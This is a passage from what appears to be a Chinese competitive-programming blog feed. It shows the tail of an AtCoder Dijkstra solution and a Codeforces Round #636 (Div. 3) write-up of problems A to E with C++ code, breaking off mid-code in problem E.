operator">=</span> tp<span class="token punctuation">.</span>second<span class="token punctuation">.</span>first<span class="token punctuation">;</span>        ll nowcost <span class="token operator">=</span> tp<span class="token punctuation">.</span>first<span class="token punctuation">;</span>        ll nows <span class="token operator">=</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>tp<span class="token punctuation">.</span>second<span class="token punctuation">.</span>second<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>to <span class="token operator">:</span> G<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            ll newcost <span class="token operator">=</span> nowcost <span class="token operator">+</span> to<span class="token punctuation">.</span>second<span class="token punctuation">.</span>second<span class="token punctuation">;</span>            ll nwe <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>nows <span class="token operator">-</span> to<span class="token punctuation">.</span>second<span class="token punctuation">.</span>first<span class="token punctuation">,</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>tot <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nwe <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>to<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span> <span class="token operator">></span> newcost<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>to<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span> <span class="token operator">=</span> newcost<span class="token punctuation">;</span>                    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>newcost<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>to<span class="token punctuation">.</span>first<span class="token punctuation">,</span> nwe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ll nwecost <span class="token operator">=</span> nowcost <span class="token operator">+</span> d<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">;</span>        ll nwe <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>nows <span class="token operator">+</span> c<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ll<span class="token punctuation">)</span>tot <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span><span class="token operator">></span>nwecost<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>nowpos<span class="token punctuation">]</span><span class="token punctuation">[</span>nwe<span class="token punctuation">]</span> <span class="token operator">=</span> nwecost<span class="token punctuation">;</span>            pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>nwecost<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>nowpos<span class="token punctuation">,</span> nwe<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v <span class="token operator">>></span> a <span class="token operator">>></span> b<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>v<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>a<span class="token punctuation">,</span> b<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>u<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>a<span class="token punctuation">,</span> b<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">dijk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ll ans<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> inf<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tot<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AtCoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round #636 (Div. 3)</title>
      <link href="/2020/04/22/Codeforces-Round-636-Div-3/"/>
      <url>/2020/04/22/Codeforces-Round-636-Div-3/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h1 id="Codeforces-Round-636-Div-3"><a href="#Codeforces-Round-636-Div-3" class="headerlink" title="Codeforces Round #636 (Div. 3)"></a>Codeforces Round #636 (Div. 3)</h1><p> 前言:<br>打到D题的时候卡住了，不应该想线段树这么复杂的做法的，虽然有人用线段树过了QAQ，还是太菜了。</p><h2 id="A-Candies"><a href="#A-Candies" class="headerlink" title="A. Candies"></a><a href="https://codeforces.com/contest/1343/problem/A">A. Candies</a></h2><ul><li>题意：<br>给定$x,k,n$均为正整数，且满足$x+2x+4x+….+2^{k-1}x=n$,$k&gt;1$,输出任意一个满足上述式子的$x$的值</li><li>题解&amp;代码:<br>按题意模拟即可<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>N<span class="token operator">%</span>tmp<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> N <span class="token operator">/</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        tmp <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        tmp<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="B-Balanced-Array"><a href="#B-Balanced-Array" class="headerlink" title="B. Balanced Array"></a><a href="https://codeforces.com/contest/1343/problem/B">B. Balanced Array</a></h2><ul><li>题意:<br>给定一个偶数$n$ , 输出 $2n$ 个数，前$n$个数为偶数，后$n$个数为奇数，要求偶数的和==奇数的和。如果存在就输出，不存在就输出”NO”。</li><li>题解&amp;代码<br>可以通过奇偶性质判断，当$\frac{n}{2}$为奇数时，奇数的和为奇数，则无法满足要求。为偶数时按题意模拟即可.<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>N<span class="token operator">/</span><span class="token number">2</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"NO\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"YES\n"</span><span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tmp<span class="token operator">+=</span><span class="token number">2</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        sum <span class="token operator">+=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    tmp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tmp <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h2 id="C-Alternating-Subsequence"><a href="#C-Alternating-Subsequence" class="headerlink" title="C. Alternating Subsequence"></a><a href="https://codeforces.com/contest/1343/problem/C">C. Alternating Subsequence</a></h2><ul><li><p>题意:<br>给定一个包含$n$个数的序列，让你求出最长的子序列，其中子序列种的相邻两个数必须不同号，输出子序列的和。如果相同长度，则输出最大子序列的和。</p></li><li><p>题解&amp;代码<br>划分区间，每个区间取最大值即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll tmp <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ll lst <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>lst<span class="token operator">*</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span> i<span class="token operator">==</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            sum <span class="token operator">+=</span> tmp<span class="token punctuation">;</span>            lst <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            tmp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        tmp <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> sum <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="D-Constant-Palindrome-Sum"><a href="#D-Constant-Palindrome-Sum" class="headerlink" title="D. Constant Palindrome Sum"></a><a href="https://codeforces.com/contest/1343/problem/D">D. Constant Palindrome Sum</a></h2><ul><li><p>题意:<br>给定偶数$n$, 正整数$k$，和包含$2n$个数的数组$a[2n]$, 可以将数组中的数改变为$[1:k]$ 这个范围的任意数使得$a[i]+a[n-i+1]$ 之和全部相等，改变数字的最小次数是多少。</p></li><li><p>题解&amp;代码:<br>用线段树或者差分都能做。我比赛的时候线段树写崩了。。。QAQ，这里讲差分的做法。<br>$a[i]+a[n-i+1]$ 改变一个数字所能达到的最大范围是<br>$[min(a[i],a[n-i+1])+1,max(a[i],a[n-i+1])+k]$,那么我们只要把这个区间的数+1，然后就可以发现没有+1的区间需要改变两次才能成功。那么我们只要枚举$[1:2k]$，更新答案即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> pref<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span> vis <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>pref<span class="token punctuation">,</span> pref <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> tmp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> r <span class="token operator">=</span> k <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tl <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tr <span class="token operator">=</span> k <span class="token operator">+</span> a<span class="token punctuation">[</span>n <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> mn <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> tl<span class="token punctuation">)</span><span class="token punctuation">,</span> mx <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> tr<span class="token punctuation">)</span><span class="token punctuation">;</span>        pref<span class="token punctuation">[</span>mn<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">,</span> pref<span class="token punctuation">[</span>mx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> k <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> pref<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>n <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> pref<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="E-Weights-Distributing"><a href="#E-Weights-Distributing" class="headerlink" title="E. Weights Distributing"></a><a href="https://codeforces.com/contest/1343/problem/E">E. Weights Distributing</a></h2><ul><li><p>题意：<br>给定$n$ 个点，$m$条边，$m$个边的权值，点$a,b,c$,让你求出如何分配权值，使得$a-&gt;b,b-&gt;c$这条路径的权值和最小，输出这个权值和。</p></li><li><p>题解&amp;代码:<br>考虑中间点$x$,那么只要求出$a-&gt;x,x-&gt;b,b-&gt;x,c-&gt;x$之和即可，使用三次bfs求出$a,b,c$到各点的距离，之后枚举点即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> pre<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">&amp;</span>vec<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> que<span class="token punctuation">;</span>    que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tp<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>que<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        tp <span class="token operator">=</span> que<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> G<span class="token punctuation">[</span>tp<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>inf<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> vec<span class="token punctuation">[</span>tp<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ll pref<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> a <span class="token operator">>></span> b <span class="token operator">>></span> c<span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>pref<span class="token punctuation">,</span> pref <span class="token operator">+</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">path1</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">path2</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">path3</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>inf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bfs</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> path1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">bfs</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> path2<span class="token 